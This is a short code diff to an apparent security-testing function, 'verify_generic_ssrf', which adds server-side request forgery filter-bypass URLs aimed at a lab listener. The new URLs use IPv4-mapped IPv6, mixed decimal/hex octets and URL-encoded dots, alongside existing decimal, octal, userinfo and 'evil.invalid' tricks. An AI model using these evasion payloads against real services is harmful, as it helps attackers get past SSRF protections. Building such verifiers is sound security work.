@@ -3869,6 +3869,10 @@ def verify_generic_ssrf(
                 dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                 hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                 octip = "0" + ".".join(f"{x:03o}" for x in parts)
+                # IPv4-mapped IPv6 representation: bypasses filters that only block dotted-decimal
+                ipv6_mapped = "::ffff:" + listener_ip
+                # Mixed-radix: decimal.decimal.hex.hex
+                mixed_hex = f"{parts[0]}.{parts[1]}.0x{parts[2]:02x}.0x{parts[3]:02x}"
                 urls += [
                     f"http://{listener_ip}:8080/{path}",
                     f"http://{dec}:8080/{path}",
@@ -3877,6 +3881,10 @@ def verify_generic_ssrf(
                     f"http://trusted-host@{listener_ip}:8080/{path}",
                     f"http://{listener_ip}:8080@evil.invalid/{path}",
                     f"http://{lab.listener}.:8080/{path}",
+                    f"http://[{ipv6_mapped}]:8080/{path}",
+                    f"http://{mixed_hex}:8080/{path}",
+                    # URL-encoded dot: some filters split on literal "." only
+                    f"http://{listener_ip.replace('.', '%2e')}:8080/{path}",
                 ]
             return urls
 
